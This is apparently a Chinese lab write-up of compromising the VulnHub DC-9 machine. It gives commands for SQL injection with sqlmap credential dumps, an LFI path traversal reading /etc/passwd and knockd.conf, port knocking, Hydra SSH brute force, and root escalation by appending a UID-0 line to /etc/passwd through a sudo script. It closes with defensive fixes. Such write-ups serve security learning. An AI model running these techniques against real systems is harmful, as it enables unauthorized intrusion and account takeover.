---
title: VulnHub DC-9 靶机实战
date: 2024-09-15 08:00:00
tags:
  - Web安全
  - 渗透测试
  - 靶场
categories: 渗透测试
description: VulnHub DC-9 靶机完整渗透实战。从搜索框 SQL 注入入手，通过 SQLMap 拖库获取凭据，利用 LFI 读取 knockd 配置文件完成端口敲门开启 SSH，经 Hydra 两轮爆破拿到 Shell，最终通过 SUID Python 脚本写入 /etc/passwd 实现提权。
---

> **靶机来源：** VulnHub - DC-9
> **渗透环境：** Kali Linux（攻击机）+ VirtualBox（靶机）
> **声明：** 本文为个人安全学习记录，所有操作均在授权靶场环境中进行，切勿将文中技术用于未授权测试。

***

## 1. 环境配置

| 角色 | 系统 | IP |
|------|------|----|
| 攻击机 | Kali Linux | 192.168.0.112 |
| 靶机 | DC-9 | NAT 网段，需探测 |

DC-9 是 VulnHub DC 系列的收官之作，融合了 SQL 注入、LFI 文件读取、端口敲门（knockd）、SSH 爆破以及 SUID 脚本提权，综合性很强。

***

## 2. 信息收集

### 主机发现与端口扫描

```bash
arp-scan -l                     # 主机发现
nmap -sV -sC -p- <target_ip>    # 全端口扫描
```

| 端口 | 服务 | 状态 |
|------|------|------|
| 80 | Apache httpd | open |
| 22 | SSH | **filtered** |

SSH 端口 `filtered` 是重要线索——说明被防火墙或端口敲门机制屏蔽。

### Web 目录扫描

```bash
dirb http://<target_ip>/
# 发现：index.php, results.php, search.php, manage.php
```

**search.php** 提供搜索表单，**results.php** 负责展示结果，**manage.php** 是管理登录入口。

### SQL 注入探测

```sql
test            -- 正常结果
test'           -- 报错/异常
1' AND 1=1-- -  -- 正常
1' AND 1=2-- -  -- 异常
```

单引号导致异常、布尔条件产生差异化响应，确认搜索功能存在 SQL 注入。

***

## 3. SQLMap 拖库

### 枚举数据库

```bash
# 枚举所有数据库
sqlmap -u "http://<target>/results.php" --data "search=test" --dbs --batch
# 关键库：Staff, users

# 枚举 Staff 库的表
sqlmap -u "http://<target>/results.php" --data "search=test" -D Staff --tables
# 关键表：Users
```

### 导出管理员凭据

```bash
sqlmap -u "http://<target>/results.php" --data "search=test" -D Staff -T Users --dump
# admin | 856f5de590ef37314e7c3bdf6f8a66dc (MD5)
```

通过 hashcat 或在线彩虹表破解 MD5 得到：**transorbital1**。

### 导出员工账号

```bash
sqlmap -u "http://<target>/results.php" --data "search=test" -D users -T UserDetails --dump
# 一批 username:password，保存为 credentials.txt
```

这些凭据留待后续 SSH 爆破使用。

***

## 4. 后台登录与 LFI

### 登录与 LFI 探测

使用 `admin / transorbital1` 登录 `manage.php`。页面底部提示 "File does not exist"，暗示可能存在文件包含。

```bash
# 验证 LFI
http://<target>/manage.php?file=../../../../etc/passwd  # 成功
```

### 读取 knockd.conf

```bash
http://<target>/manage.php?file=../../../../etc/knockd.conf
```

```ini
[openSSH]
    sequence    = 7469,8475,9842
    seq_timeout = 25
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT

[closeSSH]
    sequence    = 9842,8475,7469
    seq_timeout = 25
    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

解读：按 **7469 → 8475 → 9842** 顺序在 25 秒内敲门，iptables 即放行 22 端口。

***

## 5. 端口敲门（Port Knocking）

knockd 在后台监听防火墙丢弃的 SYN 包，匹配预设序列后触发 iptables 规则变更。

```bash
# 方法1: knock 工具（推荐）
apt install knockd
knock <target> 7469 8475 9842

# 方法2: netcat 手动敲门
nc -zv <target> 7469
nc -zv <target> 8475
nc -zv <target> 9842
```

> 必须在 25 秒内按序完成三次敲门，否则超时需重来。

```bash
nmap -p 22 <target>   # 状态由 filtered → open
```

***

## 6. SSH 爆破

### 第一轮：Sqlmap 导出凭据

```bash
hydra -L users.txt -P passwords.txt ssh://<target>
```

| 用户名 | 密码 |
|--------|------|
| chandlerb | UrAG0D! |
| joeyt | Passw0rd |
| janitor | Ilovepeepee |

### janitor 横向发现

```bash
ssh janitor@<target>
ls -la                           # .secrets-for-putin/
cat .secrets-for-putin/passwords # 新密码组
```

```
BamBam01 / Passw0rd / smellycats / P0Lic#10-4 / B4-Tru3-001 / 4uGU5T-NiGHts
```

### 第二轮：新密码字典

```bash
hydra -L users.txt -P new_passwords.txt ssh://<target>
```

| 用户名 | 密码 |
|--------|------|
| fredf | **B4-Tru3-001** |

***

## 7. 提权：SUID Python 脚本利用

### 枚举 sudo 权限

```bash
ssh fredf@<target>
sudo -l
# (root) NOPASSWD: /opt/devstuff/dist/test/test
```

### 审计源码

```bash
cat /opt/devstuff/test.py
```

```python
#!/usr/bin/python
import sys

if len(sys.argv) != 3:
    print("Usage: python test.py read append")
    sys.exit(1)

f = open(sys.argv[1], "r")
output = f.read()
f.close()
f = open(sys.argv[2], "a")
f.write(output)        # 以 root 将文件1追加到文件2末尾
f.close()
```

功能很简单：root 权限将参数1内容追加写入参数2末尾——相当于任意文件写入原语。

### 构造利用链

思路：向 `/etc/passwd` 追加一条 UID=0 的用户记录。

**攻击机生成密码哈希：**

```bash
openssl passwd -6 -salt dc9admin toor123
# $6$dc9admin$xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

**靶机构造 payload 并写入：**

```bash
cd /opt/devstuff/dist/test/
echo 'dc9root:$6$dc9admin$xxxxxxxxxxxxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash' > /tmp/exp
sudo ./test /tmp/exp /etc/passwd
```

passwd 行格式中 UID=0 即 root 权限。

```bash
su dc9root            # 密码 toor123
id                    # uid=0(root)
cat /root/theflag.txt
```

### 提权原理

```
fredf (普通用户)
  └── sudo ./test <src> <dst> (root, 无密码)
       └── 追加 UID=0 的 passwd 条目
            └── su dc9root → root 达成
```

***

## 8. 攻击链路总结

### 流程图

```
┌──────────────────────────────────────────────────────┐
│                  DC-9 完整攻击链路                      │
├──────────────────────────────────────────────────────┤
│                                                      │
│  [1] nmap 端口扫描 → 80 open, 22 filtered             │
│        │                                             │
│        ▼                                             │
│  [2] 搜索框 SQL 注入 → 确认注入点                      │
│        │                                             │
│        ▼                                             │
│  [3] SQLMap 拖库 → admin/transorbital1               │
│        │           → 员工账号密码列表                  │
│        ▼                                             │
│  [4] 后台登录 + LFI → 读取 /etc/knockd.conf           │
│        │                                             │
│        ▼                                             │
│  [5] 端口敲门 (7469→8475→9842) → SSH 开放             │
│        │                                             │
│        ▼                                             │
│  [6] Hydra 两轮爆破 → fredf:B4-Tru3-001               │
│        │                                             │
│        ▼                                             │
│  [7] sudo ./test → 追加恶意条目至 /etc/passwd          │
│        │                                             │
│        ▼                                             │
│  [8] su dc9root → UID=0 → /root/theflag.txt          │
│                                                      │
└──────────────────────────────────────────────────────┘
```

### 工具与技术总结

| 工具 | 阶段 | 用途 |
|------|------|------|
| arp-scan / nmap | 信息收集 | 主机发现与端口扫描 |
| dirb | 信息收集 | Web 目录枚举 |
| sqlmap | 漏洞利用 | POST SQL 注入自动拖库 |
| hashcat | 密码破解 | MD5 哈希还原 |
| LFI（目录穿越） | 信息收集 | 读取 knockd.conf 获取敲门序列 |
| knock / nc | 端口敲门 | 触发 iptables 放行 SSH |
| hydra | 暴力破解 | SSH 密码爆破 |
| sudo misconfig | 提权 | 无密码 root 执行写入脚本 |
| openssl | 提权 | 生成 /etc/passwd 兼容哈希 |

### 知识点沉淀

1. **搜索框 SQL 注入：** 搜索功能是高频注入点，POST 请求的 `--data` 参数同样需要测试。
2. **filtered 端口 ≠ 永久关闭：** 应考虑端口敲门机制，LFI 读取 `/etc/knockd.conf` 是高效探测手段。
3. **多轮爆破策略：** 每个用户的家目录都可能隐藏新凭据，横向移动不要在第一轮停止。
4. **passwd 追加提权：** 向 `/etc/passwd` 追加 UID=0 用户是经典手法，前提有 root 写入原语且文件可追加。
5. **漏洞链思维：** 单个漏洞往往不足以破防——SQLi → LFI → Knock → SSH → Privesc 串联形成完整攻击路径。

***

## 附录：防御建议

| 漏洞 | 修复措施 |
|------|----------|
| SQL 注入 | 参数化查询 / 预编译语句 |
| LFI | 白名单限制文件访问，禁止 `../` 目录穿越 |
| 端口敲门弱序列 | 增加序列长度与随机性 |
| 弱密码 | 强制密码复杂度，定期更换 |
| SUID 脚本滥用 | 限制 sudo 粒度，审计高风险程序 |
| /etc/passwd 可写 | 设置 644 权限，非 root 不可写 |
